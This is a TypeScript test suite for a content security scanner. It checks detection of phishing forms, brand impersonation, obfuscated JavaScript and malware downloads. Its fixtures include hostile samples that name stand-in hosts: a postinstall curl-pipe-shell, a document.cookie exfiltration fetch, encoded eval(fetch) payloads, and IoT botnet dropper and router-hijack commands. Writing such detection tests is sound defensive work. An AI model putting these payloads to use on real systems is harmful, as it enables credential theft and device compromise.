import { assessRedirect, createScanner, detectContentKind, normalizeUrl } from "../src/index";
import { binaryRules, cssRules, decodedArtifactRules, htmlRules, htmlTechnologyRules, rulePacks, scriptCompositeRules, scriptRiskRules, sourceCodeRules, urlRules } from "../src/rules/packs";

const encoder = new TextEncoder();

test("detects content kind from content type, extension, and first bytes", () => {
  expect(detectContentKind({ contentType: "text/html; charset=utf-8" })).toBe("html");
  expect(detectContentKind({ filename: "app.js" })).toBe("javascript");
  expect(detectContentKind({ firstBytes: encoder.encode("<!doctype html><html>") })).toBe("html");
  expect(detectContentKind({ firstBytes: new Uint8Array([0x1f, 0x8b, 0x08, 0x00]) })).toBe("archive");
  expect(detectContentKind({ contentType: "application/zip", firstBytes: elfFixture() })).toBe("executable");
  expect(detectContentKind({ firstBytes: encoder.encode("<svg viewBox='0 0 1 1'></svg>") })).toBe("svg");
  expect(detectContentKind({ firstBytes: encoder.encode("@import url('x.css');") })).toBe("css");
  expect(detectContentKind({ contentType: "application/json" })).toBe("json");
  expect(detectContentKind({ contentType: "text/plain" })).toBe("text");
  expect(detectContentKind({ firstBytes: new Uint8Array() })).toBe("unknown");
});

test("normalizes URLs and classifies off-site, punycode, and shortener destinations", () => {
  const url = normalizeUrl("https://xn--paypa1-l2c.example/login#fragment", "https://shop.example.com/checkout");
  expect(url?.flags).toContain("punycode");
  expect(url?.relation).toBe("off-site");

  const short = normalizeUrl("https://bit.ly/login", "https://example.com");
  expect(short?.destinationType).toBe("url-shortener");

  const privateIp = normalizeUrl("http://192.168.0.2/login", "https://example.com");
  expect(privateIp?.flags).toContain("private_or_localhost");
  expect(privateIp?.destinationType).toBe("private");

  const payload = normalizeUrl("https://files.bad.zip/update.exe", "https://example.com");
  expect(payload?.flags).toEqual(expect.arrayContaining(["suspicious_tld", "download_like_path"]));

  const malwarePath = normalizeUrl("http://203.0.113.10/bin.sh", "https://example.com");
  expect(malwarePath?.flags).toEqual(expect.arrayContaining(["ip_literal", "malware_download_like_path"]));
});

test("detects formless credential capture (password inputs outside a <form>)", () => {
  const scan = (html: string, url: string) => {
    const scanner = createScanner({ source: { url, contentType: "text/html" } });
    scanner.feed(new TextEncoder().encode(html));
    return scanner.finish().findings.map((f) => f.ruleId);
  };
  // A PIN/OTP grid: password inputs with no <form>, on a shared-hosting subdomain.
  const pinGrid = `<html><body><div class="pin">${"<input type=password maxlength=1>".repeat(6)}</div></body></html>`;
  expect(scan(pinGrid, "https://victim123.github.io/login/")).toContain("credential_form_on_suspicious_host");
  // The same formless password field on an ordinary established domain is not convicted.
  expect(scan(pinGrid, "https://example.com/")).not.toContain("credential_form_on_suspicious_host");
});

test("htmlparser2 tokenization survives evasion that defeats <tag …> regexes", () => {
  const scan = (html: string, url: string) => {
    const scanner = createScanner({ source: { url, contentType: "text/html" } });
    scanner.feed(new TextEncoder().encode(html));
    return scanner.finish().findings.map((f) => f.ruleId);
  };
  // A `>` inside a quoted attribute value before type="password": the old
  // `<\s*([a-z0-9:-]+)\b([^>]*)>` regex stops at that `>`, never sees the
  // password type, and misses the credential capture. htmlparser2 tokenizes it
  // correctly.
  const evasive = `<html><body><div><input name="u" data-tip="click > here" type="password"></div></body></html>`;
  expect(scan(evasive, "https://victim123.github.io/login/")).toContain("credential_form_on_suspicious_host");
  // An entity-encoded off-origin form action — `>` and the scheme hidden behind
  // entities — still resolves to the off-origin POST target after decoding.
  const encodedAction = `<form action="https&#58;//harvest.evil.test/p" method="post"><input type="password" name="pw"></form>`;
  expect(scan(encodedAction, "https://login.example.com/")).toContain("credential_form_posts_off_origin");
});

test("flags brand impersonation in content but not the brand's own login", () => {
  const scan = (html: string, url: string) => {
    const scanner = createScanner({ source: { url, contentType: "text/html" } });
    scanner.feed(new TextEncoder().encode(html));
    return scanner.finish().findings.map((f) => f.ruleId);
  };
  const msLogin = `<html><head><title>Sign in to your Microsoft account</title></head><body><form action="save.php"><input type="password" name="passwd"></form></body></html>`;
  // Brand in <title> + credential field on a non-Microsoft domain => impersonation.
  expect(scan(msLogin, "https://login-update.evil.example/")).toContain("brand_impersonation_content");
  // Same page on Microsoft's own domain => not impersonation.
  expect(scan(msLogin, "https://login.microsoftonline.com/")).not.toContain("brand_impersonation_content");
  // A site that merely names a brand it isn't, with a login, on a reputable host
  // (no throwaway flag, brand not in title) => not flagged.
  expect(scan(`<title>Acme</title><body>we integrate with paypal, paypal, paypal<form><input type=password></form>`, "https://www.acme-corp.com/login")).not.toContain("brand_impersonation_content");
});

test("assessRedirect convicts only off-site hops to suspicious destinations", () => {
  // Same registrable domain (subdomain hop) — not off-site.
  expect(assessRedirect("https://google.com/", "https://www.google.com/")?.offSite).toBe(false);
  // Different registrable domain but an ordinary host — off-site, not suspicious.
  const geo = assessRedirect("https://google.com/", "https://google.de/");
  expect(geo?.offSite).toBe(true);
  expect(geo?.destinationSuspicious).toBe(false);
  // Off-site hop to a URL shortener / sketchy host — suspicious.
  const shortened = assessRedirect("https://example.com/", "https://bit.ly/abc123");
  expect(shortened?.offSite).toBe(true);
  expect(shortened?.destinationSuspicious).toBe(true);
  // Garbage input is ignored, not thrown.
  expect(assessRedirect("not a url", "also not")).toBeNull();
});

test("streams HTML, extracts URLs, and detects off-origin credential form", () => {
  const scanner = createScanner({ source: { url: "https://example.com/login", contentType: "text/html" } });
  scanner.feed(encoder.encode('<form action="https://evil.test/post" method="post"><input type="password" name="password">'));
  scanner.feed(encoder.encode('<script src="http://cdn.evil.test/a.js"></script>'));
  const report = scanner.finish();

  expect(report.contentKind).toBe("html");
  expect(report.urls.map((url) => url.normalized)).toEqual(expect.arrayContaining(["https://evil.test/post", "http://cdn.evil.test/a.js"]));
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["credential_form_posts_off_origin", "external_script_from_unrelated_domain", "mixed_content_script"])
  );
  expect(report.findings.find((finding) => finding.ruleId === "credential_form_posts_off_origin")?.metadata.rule_pack).toBe("phishing");
  expect(report.disposition).toBe("block");
});

test("rescans decoded JavaScript artifacts and reports decoded dynamic execution", () => {
  const scanner = createScanner({ source: { filename: "app.js", contentType: "application/javascript" } });
  scanner.feed(encoder.encode("const x = atob('ZXZhbChmZXRjaCgiaHR0cHM6Ly9ldmlsLnRlc3QvcCIpKQ=='); eval(x);"));
  const report = scanner.finish();

  expect(report.artifacts.some((artifact) => artifact.artifactType === "base64_decoded_string")).toBe(true);
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["decoded_dynamic_execution", "large_base64_blob"]));
});

test("decodes JavaScript escape artifacts with bounded rescanning", () => {
  const scanner = createScanner({ source: { filename: "escaped.js", contentType: "application/javascript" } });
  scanner.feed(encoder.encode('const y="\\x65\\x76\\x61\\x6c\\x28\\x66\\x65\\x74\\x63\\x68\\x28\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x74\\x65\\x73\\x74\\x27\\x29\\x29";'));
  const report = scanner.finish();

  expect(report.artifacts.some((artifact) => artifact.artifactType === "javascript_hex_escapes")).toBe(true);
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["javascript_hex_escapes", "dynamic_code_execution"]));
});

test("keeps bounded carry state across split chunks", () => {
  const scanner = createScanner({ source: { url: "https://example.com/login", contentType: "text/html" } });
  scanner.feed(encoder.encode('<form action="https://evil.test/post" method="post"><input type="pass'));
  scanner.feed(encoder.encode('word" name="password"><script>const u="https://exfil.test/p"; fe'));
  scanner.feed(encoder.encode('tch(u, {body: document.cookie}); window.ethereum.request({method:"eth_requestAccounts"});</script>'));
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["credential_form_posts_off_origin", "credential_exfil_candidate", "wallet_interaction_with_obfuscation"])
  );
  expect(report.counters.bytes_seen).toBeGreaterThan(0);
  expect(report.counters.lines_seen).toBeGreaterThanOrEqual(1);
});

test("detects CSS SEO spam and payment-form risk signals", () => {
  const scanner = createScanner({ source: { url: "https://shop.example/checkout", contentType: "text/html" } });
  scanner.feed(
    encoder.encode(
      '<form action="/pay"><input name="cardnumber" autocomplete="cc-number"><script src="https://scripts.other.test/pay.js"></script><style>.links{display:none;unicode-bidi:bidi-override}</style>'
    )
  );
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["card_fields_plus_external_script", "hidden_link_cluster", "unicode_bidi_trick"])
  );
  expect(report.findings.find((finding) => finding.ruleId === "hidden_link_cluster")?.metadata.rule_pack).toBe("seo-spam");
});

test("detects iframe and redirect rules while extracting structural URLs", () => {
  const scanner = createScanner({ source: { url: "https://example.com", contentType: "text/html" } });
  scanner.feed(
    encoder.encode(
      '<iframe src="https://evil.test/login" width="1" height="1"></iframe><meta http-equiv="refresh" content="0; url=https://bit.ly/login"><a href="/account">account</a>'
    )
  );
  const report = scanner.finish();

  expect(report.urls.map((url) => url.normalized)).toEqual(
    expect.arrayContaining(["https://evil.test/login", "https://bit.ly/login", "https://example.com/account"])
  );
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["hidden_iframe_off_origin", "meta_refresh_external"])
  );
  // A bit.ly link in CONTENT (meta-refresh target here) must NOT flag the
  // shortener rule — search/social/news pages are full of them. meta_refresh_external
  // already covers the off-site redirect.
  expect(report.findings.map((finding) => finding.ruleId)).not.toContain("redirect_to_url_shortener");
  expect(report.findings.find((finding) => finding.ruleId === "meta_refresh_external")?.metadata.rule_pack).toBe("redirects");
});

test("flags redirect_to_url_shortener only when the scanned URL is itself a shortener", () => {
  // Scanned target IS a shortener (cloaking) => flag.
  const onShortener = createScanner({ source: { url: "https://bit.ly/xY3pQ", contentType: "text/html" } });
  onShortener.feed(encoder.encode("<html><body>redirecting…</body></html>"));
  expect(onShortener.finish().findings.map((f) => f.ruleId)).toContain("redirect_to_url_shortener");

  // Ordinary page that merely links to a shortener in content => no flag.
  const linksToShortener = createScanner({ source: { url: "https://news.example/article", contentType: "text/html" } });
  linksToShortener.feed(encoder.encode('<a href="https://bit.ly/xY3pQ">source</a>'));
  expect(linksToShortener.finish().findings.map((f) => f.ruleId)).not.toContain("redirect_to_url_shortener");
});

test("detects source-code risk signals in streamed file content", () => {
  const scanner = createScanner({ source: { filename: "package.json", contentType: "application/json" } });
  scanner.feed(encoder.encode('{"scripts":{"postinstall":"curl https://payload.test/install.sh | sh"}}'));
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["postinstall_script", "curl_pipe_shell"]));
});

test("detects expanded web surface and dependency fingerprints", () => {
  const scanner = createScanner({ source: { url: "https://example.com", contentType: "text/html" } });
  scanner.feed(
    encoder.encode(
      '<meta name="generator" content="WordPress 6.4"><script src="/wp-content/themes/a/jquery-1.12.4.min.js"></script><script src="/core/misc/drupal.js"></script><a href="/phpmyadmin/">admin</a><script src="/js/bootstrap-3.4.1.min.js"></script><script src="/js/lodash-4.17.20.min.js"></script>'
    )
  );
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining([
      "wordpress_surface_reference",
      "drupal_surface_reference",
      "phpmyadmin_surface_reference",
      "legacy_jquery_reference",
      "legacy_bootstrap_reference",
      "legacy_lodash_reference"
    ])
  );
});

test("detects URL-risk, CSS import, and invisible overlay signatures", () => {
  const scanner = createScanner({ source: { url: "https://shop.example/checkout", contentType: "text/html" } });
  scanner.feed(
    encoder.encode(
      '<form><input name="cardnumber" autocomplete="cc-number"></form><style>@import "https://cdn.bad.zip/style.css"; .payment-form input.capture{position:fixed; inset:0; opacity:0; pointer-events:auto; z-index:9999}</style><a href="https://files.bad.zip/payload.exe">download</a><a href="http://10.0.0.8/login">router</a>'
    )
  );
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["suspicious_tld_url", "download_like_external_url", "css_imports_suspicious_domain"])
  );
  expect(report.counters.invisible_form_overlay).toBe(1);
});

test("adds low-context shared-hosting URL signal for target URLs", () => {
  const scanner = createScanner({ source: { url: "https://trade-tetherapps.wixstudio.com/en-us", contentType: "text/html" } });
  scanner.feed(encoder.encode("<!doctype html><html><body>hosted page</body></html>"));
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toContain("shared_hosting_subdomain_url");
  expect(report.urls.find((url) => url.normalized === "https://trade-tetherapps.wixstudio.com/en-us")?.flags).toContain("shared_hosting_subdomain");
  expect(report.findings.find((finding) => finding.ruleId === "shared_hosting_subdomain_url")?.severity).toBe("low");
});

test("adds independent signals for shared-hosted crypto login pages rendered as screenshot images", () => {
  const scanner = createScanner({ source: { url: "https://trade-tetherapps.wixstudio.com/en-us", contentType: "text/html" } });
  scanner.feed(encoder.encode(`
    <script type="application/json">
      {
        "props": {
          "seo": {
            "title": "Tether | Login",
            "description": "Access your crypto wallet securely with Tether Login."
          },
          "render": {
            "compProps": {
              "hero": {
                "imageInfo": {
                  "imageData": {
                    "alt": "screencapture-app-tether-to-app-login-2026-05-29.png",
                    "name": "screencapture-app-tether-to-app-login-2026-05-29.png"
                  }
                }
              }
            }
          }
        }
      }
    </script>
  `));
  const report = scanner.finish();

  expect(report.counters["content.crypto_wallet_login_language"]).toBeGreaterThan(0);
  expect(report.counters["content.login_ui_image_reference"]).toBeGreaterThan(0);
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["shared_hosting_subdomain_url", "credential_ui_rendered_as_image", "crypto_wallet_login_language"])
  );
  expect(report.disposition).toBe("block");
});

test("adds independent signals for shared-hosted DeFi landing pages with trademark stuffing", () => {
  const scanner = createScanner({ source: { url: "https://home-apps-jupiter.wixstudio.com/us-en", contentType: "text/html" } });
  scanner.feed(encoder.encode(`
    <title>Jupiter Swap®™</title>
    <meta name="description" content="The flagship Jupiter Swap engine routes your trade across all major Solana DEXs simultaneously.">
  `));
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["shared_hosting_subdomain_url", "crypto_trading_landing_language", "seo_trademark_stuffing"])
  );
  expect(report.disposition).toBe("block");
});

test("detects credential forms on redirected generated hosts", () => {
  const scanner = createScanner({
    source: {
      url: "http://abr.abbruchberlin.com/",
      finalUrl: "https://manager-area-client92745867.vttlr77.fr/c15f0eed63e8184c07e0b1c8665ca7f6/?payer",
      contentType: "text/html"
    }
  });
  scanner.feed(encoder.encode('<form action="config/to-us.php" method="post"><input name="username"><input type="password" name="password"></form>'));
  const report = scanner.finish();

  expect(report.urls.find((url) => url.normalized.startsWith("https://manager-area-client92745867"))?.flags).toContain("generated_host_label");
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining(["final_url_offsite_redirect", "credential_form_on_suspicious_host"])
  );
  expect(report.disposition).toBe("block");
});

test("classifies TLS credibility metadata inside the scanner", () => {
  const scanner = createScanner({
    source: {
      url: "https://www.bbc.com/",
      contentType: "text/html",
      tls: {
        issuer: "C=US, O=Let's Encrypt, CN=R3",
        subject: "CN=www.bbc.com"
      }
    }
  });
  scanner.feed(encoder.encode("<!doctype html><html></html>"));
  const report = scanner.finish();

  expect(report.counters["tls.free_dv_certificate"]).toBe(1);
  expect(report.counters["tls.issuer.c_us_o_let_s_encrypt_cn_r3"]).toBe(1);
});

test("scores direct URLhaus-style malware download URLs before byte content is parsed", () => {
  const scanner = createScanner({ source: { url: "http://203.0.113.10/hiddenbin/boatnet.sh4" } });
  scanner.feed(new Uint8Array([0x7f, 0x45, 0x4c, 0x46]));
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["ip_literal_url", "malware_download_like_url"]));
  expect(report.score).toBeGreaterThanOrEqual(75);
  expect(report.disposition).toBe("block");
});

test("detects brand impersonation from URL before page fetch succeeds", () => {
  const scanner = createScanner({ source: { url: "https://email-ionos-mx-portal-appsuite-app-mailbox.s3.eu-north-1.amazonaws.com/index.html" } });
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["brand_impersonation_url"]));
  expect(report.findings.find((finding) => finding.ruleId === "brand_impersonation_url")?.metadata.brand).toBe("ionos");
  expect(report.disposition).toBe("review");
});

test("detects leetspeak/homoglyph brand impersonation in the host", () => {
  const scanner = createScanner({ source: { url: "https://secure-paypa1-login.verify-acct.xyz/" } });
  const report = scanner.finish();
  expect(report.findings.find((finding) => finding.ruleId === "brand_impersonation_url")?.metadata.brand).toBe("paypal");

  const ms = createScanner({ source: { url: "https://0utlook-micr0s0ft-mail.account-verify.cc/" } });
  expect(ms.finish().findings.find((finding) => finding.ruleId === "brand_impersonation_url")?.metadata.brand).toBe("microsoft");
});

test("detects generated suspicious landing URLs before page fetch succeeds", () => {
  const scanner = createScanner({ source: { url: "https://gysxrbg.winstone.casino/c0bd7510-5047-4056-b382-60b3f7cc19de" } });
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["generated_landing_url"]));
  expect(report.disposition).toBe("block");
});

test("detects executable magic, content-type mismatch, and IoT botnet binary strings", () => {
  const scanner = createScanner({ source: { url: "http://123.235.158.129:59923/i", contentType: "application/zip" } });
  const binaryText = encoder.encode(
    [
      "Mozi",
      "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget http://%s:%d/Mozi.m -O /tmp/netgear;sh netgear",
      "cfgtool set /mnt/jffs2/hw_ctree.xml InternetGatewayDevice.ManagementServer URL http://127.0.0.1",
      "iptables -I INPUT -p tcp --destination-port 7547 -j DROP",
      "1:q9:find_node1:q9:get_peers1:q13:announce_peer[cnc][atk]"
    ].join("\n")
  );
  const chunk = new Uint8Array(512 + binaryText.byteLength);
  chunk.set(elfFixture());
  chunk.set(binaryText, 512);
  scanner.feed(chunk);
  const report = scanner.finish();

  expect(report.contentKind).toBe("executable");
  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining([
      "elf_executable_magic",
      "content_type_magic_mismatch",
      "elf_writable_executable_stack",
      "iot_botnet_family_strings",
      "iot_device_exploit_strings",
      "iot_payload_dropper_commands",
      "router_management_hijack_commands",
      "firewall_lockout_commands",
      "dht_cnc_protocol_strings"
    ])
  );
  expect(report.disposition).toBe("block");
});

test("detects expanded JavaScript and Node source-code static hotspots", () => {
  const scanner = createScanner({ source: { filename: "setup.js", contentType: "application/javascript" } });
  scanner.feed(
    encoder.encode(
      [
        "require('child_process').execSync(cmd);",
        "const mod = require(name); const re = new RegExp(input);",
        "const b = new Buffer(user); crypto.createHash('sha1'); crypto.pseudoRandomBytes(8);",
        "view.escapeMarkup = false;",
        "form.action = 'https://evil.test/post';",
        "cardnumber.addEventListener('input', () => fetch('https://evil.test/pay'));",
        "window.ethereum.request({method:'eth_sendTransaction'}); navigator.sendBeacon('https://evil.test/w', data);",
        "el.insertAdjacentHTML('beforeend', html); script.src = url; document.head.appendChild(script);",
        "for (let i=0;i<s.length;i++) out += String.fromCharCode(s.charCodeAt(i)^3);"
      ].join("\n")
    )
  );
  const report = scanner.finish();

  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
    expect.arrayContaining([
      "dangerous_child_process",
      "shell_execution_import",
      "non_literal_require",
      "non_literal_regexp",
      "new_buffer_constructor",
      "weak_crypto_hash",
      "pseudo_random_bytes",
      "template_escape_disabled",
      "form_action_changed_by_javascript",
      "payment_input_event_hooks",
      "wallet_api_plus_external_beacon"
    ])
  );
  expect(report.counters).toMatchObject({
    insert_adjacent_html: 1,
    script_src_assignment: 1,
    append_child_script: 1,
    charcodeat_decoder_loop: 1
  });
});

test("exposes first-class rule packs", () => {
  expect(Object.keys(htmlRules)).toEqual(expect.arrayContaining(["credential_form_posts_off_origin", "mixed_content_script", "credential_ui_rendered_as_image", "crypto_wallet_login_language", "crypto_trading_landing_language", "credential_form_on_suspicious_host"]));
  expect(Object.keys(htmlTechnologyRules)).toEqual(expect.arrayContaining(["legacy_jquery_reference", "wordpress_surface_reference"]));
  expect(scriptRiskRules.map((rule) => rule.id)).toEqual(expect.arrayContaining(["dynamic_code_execution", "document_write_script"]));
  expect(Object.keys(scriptCompositeRules)).toEqual(expect.arrayContaining(["decoded_dynamic_execution"]));
  expect(sourceCodeRules.map((rule) => rule.id)).toEqual(expect.arrayContaining(["curl_pipe_shell", "postinstall_script", "non_literal_regexp"]));
  expect(Object.keys(cssRules)).toEqual(expect.arrayContaining(["hidden_link_cluster"]));
  expect(Object.keys(urlRules)).toEqual(expect.arrayContaining(["punycode_login_url", "final_url_offsite_redirect", "ip_literal_url", "malware_download_like_url", "shared_hosting_subdomain_url", "brand_impersonation_url", "generated_landing_url"]));
  expect(Object.keys(decodedArtifactRules)).toEqual(expect.arrayContaining(["large_base64_blob"]));
  expect(Object.keys(binaryRules)).toEqual(expect.arrayContaining(["elf_executable_magic", "content_type_magic_mismatch"]));
  expect(Object.keys(rulePacks)).toEqual(
    expect.arrayContaining([
      "phishing",
      "redirects",
      "url-risk",
      "technology-fingerprint",
      "dependency-fingerprint",
      "script-risk",
      "obfuscation",
      "exfiltration",
      "wallet",
      "payment",
      "seo-spam",
      "source-code",
      "binary-static"
    ])
  );
});

function elfFixture(): Uint8Array {
  const bytes = new Uint8Array(256);
  bytes.set([0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01]);
  const view = new DataView(bytes.buffer);
  view.setUint16(16, 2, true);
  view.setUint16(18, 0x28, true);
  view.setUint32(28, 52, true);
  view.setUint16(42, 32, true);
  view.setUint16(44, 1, true);
  view.setUint32(52, 0x6474e551, true);
  view.setUint32(52 + 24, 0x7, true);
  return bytes;
}
